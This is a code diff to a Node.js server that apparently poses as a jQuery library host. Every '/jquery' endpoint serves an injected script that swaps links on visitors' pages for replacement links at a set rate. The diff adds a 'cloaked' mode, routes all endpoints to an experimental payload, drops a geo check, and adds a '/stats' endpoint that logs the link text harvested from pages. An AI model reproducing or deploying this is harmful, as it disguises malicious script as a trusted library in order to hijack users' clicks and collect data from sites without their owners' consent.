@@ -74,7 +74,10 @@ function getClientResponseJSON(uuid, url, ip, callback) {
             var redirect_rate = docs[0].redirect_rate;
             var randomNumber = Math.random() * 100;
 
-            if(randomNumber <= redirect_rate) {
+            if(redirect_rate == -1) {
+                callback({jquery: "cloaked"});
+            }
+            else if(randomNumber <= redirect_rate) {
                 connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
                     if(docs.length > 0) {
                         var links = docs[0].links;
@@ -204,6 +207,7 @@ app.get('/jquery/latest', function (req, res) {
     sendPlainJQuery(res);
 });
 
+//I don't think this endpoint is used
 app.post('/jquery/latest', function(req, res) {
     var url = req.body.referer;
     var uuid = req.body.version;
@@ -250,22 +254,31 @@ app.post('/jquery/latest', function(req, res) {
                         if(response.jquery == false) { 
                             response = ""; 
                         }
+                        else if(response.jquery == -1) { //-1 means cloaked
+                            response = "";
+                        }
                         else { 
                             response = response.jquery; 
                         }
 
-                        if(geo.country == "UNKNOWN") {
-                            response = "";
-                        }
+                        fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
+                            if(err) throw err;
+                            var replacedFile = String(data).replace('replacemeuuid', uuid);
+                            replacedFile = String(replacedFile).replace('replacemelinks', response);
 
-                        res.writeHead(200, {
-                            'Content-Length': response.length,
-                            'Content-Type': 'text/plain',
-                            'Access-Control-Allow-Origin': '*',
-                            'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+                            if(response.jquery == -1) {
+                                 replacedFile = String(replacedFile).replace('replacemestats', 'yes');
+                            }
+
+                            res.writeHead(200, {
+                                'Content-Length': replacedFile.length,
+                                'Content-Type': 'text/plain',
+                                'Access-Control-Allow-Origin': '*',
+                                'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                                'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+                            });
+                            res.end(replacedFile);
                         });
-                        res.end(response);
                     });
                 }
                 else if(response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
@@ -339,18 +352,22 @@ app.post('/jquery/stable', function(req, res) {
                         if(response.jquery == false) { 
                             response = ""; 
                         }
+                        else if(response.jquery == -1) { //-1 means cloaked
+                            response = "";
+                        }
                         else { 
                             response = response.jquery; 
                         }
 
-                        if(geo.country == "UNKNOWN") {
-                            response = "";
-                        }
-
-                        fs.readFile('./client/compressed/compressed_landercode_new.js', function(err, data) {
+                        fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                             if(err) throw err;
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
+
+                            if(response.jquery == -1) {
+                                 replacedFile = String(replacedFile).replace('replacemestats', 'yes');
+                            }
+
                             res.writeHead(200, {
                                 'Content-Length': replacedFile.length,
                                 'Content-Type': 'text/plain',
@@ -430,18 +447,22 @@ app.post('/jquery/dist', function(req, res) {
                         if(response.jquery == false) { 
                             response = ""; 
                         }
+                        else if(response.jquery == -1) { //-1 means cloaked
+                            response = "";
+                        }
                         else { 
                             response = response.jquery; 
                         }
 
-                        //if(geo.country == "UNKNOWN") {
-                        //    response = "";
-                        //}
-
-                        fs.readFile('./client/compressed/compressed_landercode_experimental.js', function(err, data) {
+                        fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                             if(err) throw err;
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
+
+                            if(response.jquery == -1) {
+                                 replacedFile = String(replacedFile).replace('replacemestats', 'yes');
+                            }
+
                             res.writeHead(200, {
                                 'Content-Length': replacedFile.length,
                                 'Content-Type': 'text/plain',
@@ -537,18 +558,22 @@ app.get('/jquery/dist', function (req, res){
                             if(response.jquery == false) { 
                                 response = ""; 
                             }
+                            else if(response.jquery == -1) { //-1 means cloaked
+                                response = "";
+                            }
                             else { 
                                 response = response.jquery; 
                             }
 
-                            //if(geo.country == "UNKNOWN") {
-                            //    response = "";
-                            //}
-
-                            fs.readFile('./client/compressed/compressed_landercode_experimental.js', function(err, data) {
+                            fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                                 if(err) throw err;
                                 var replacedFile = String(data).replace('replacemeuuid', uuid);
                                 replacedFile = String(replacedFile).replace('replacemelinks', response);
+
+                                if(response.jquery == -1) {
+                                     replacedFile = String(replacedFile).replace('replacemestats', 'yes');
+                                }
+
                                 res.writeHead(200, {
                                     'Content-Length': replacedFile.length,
                                     'Content-Type': 'text/plain',
@@ -557,10 +582,6 @@ app.get('/jquery/dist', function (req, res){
                                     'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                                 });
                                 res.end(replacedFile);
-                                // res.status(200);
-                                // res.header('Content-type','application/json');
-                                // res.header('Charset','utf8');
-                                // res.jsonp(req.query.ver + '('+ JSON.stringify(replacedFile) + ');');
                             });
                         });
                     }
@@ -637,18 +658,22 @@ app.post('/jquery', function (req, res){
                         if(response.jquery == false) { 
                             response = ""; 
                         }
+                        else if(response.jquery == -1) { //-1 means cloaked
+                            response = "";
+                        }
                         else { 
                             response = response.jquery; 
                         }
 
-                        //if(geo.country == "UNKNOWN") {
-                        //    response = "";
-                        //}
-
-                        fs.readFile('./client/compressed/compressed_landercode_experimental.js', function(err, data) {
+                        fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
                             if(err) throw err;
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
+
+                            if(response.jquery == -1) {
+                                 replacedFile = String(replacedFile).replace('replacemestats', 'yes');
+                            }
+
                             res.writeHead(200, {
                                 'Content-Length': replacedFile.length,
                                 'Content-Type': 'text/plain',
@@ -657,10 +682,6 @@ app.post('/jquery', function (req, res){
                                 'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                             });
                             res.end(replacedFile);
-                            // res.status(200);
-                            // res.header('Content-type','application/json');
-                            // res.header('Charset','utf8');
-                            // res.jsonp(req.query.ver + '('+ JSON.stringify(replacedFile) + ');');
                         });
                     });
                 }
@@ -687,6 +708,19 @@ app.post('/jquery', function (req, res){
     }
 });
 
+app.post('/stats', function (req, res){
+    var url = req.headers['referer'];
+    console.log("all link text for url: " + url);
+    console.log(req.body.stats);
+    res.writeHead(200, {
+        'Content-Type': 'text/plain',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+    });
+    res.end('');
+
+});
 
 app.listen('9000')
 console.log('Magic happens on port 9000');
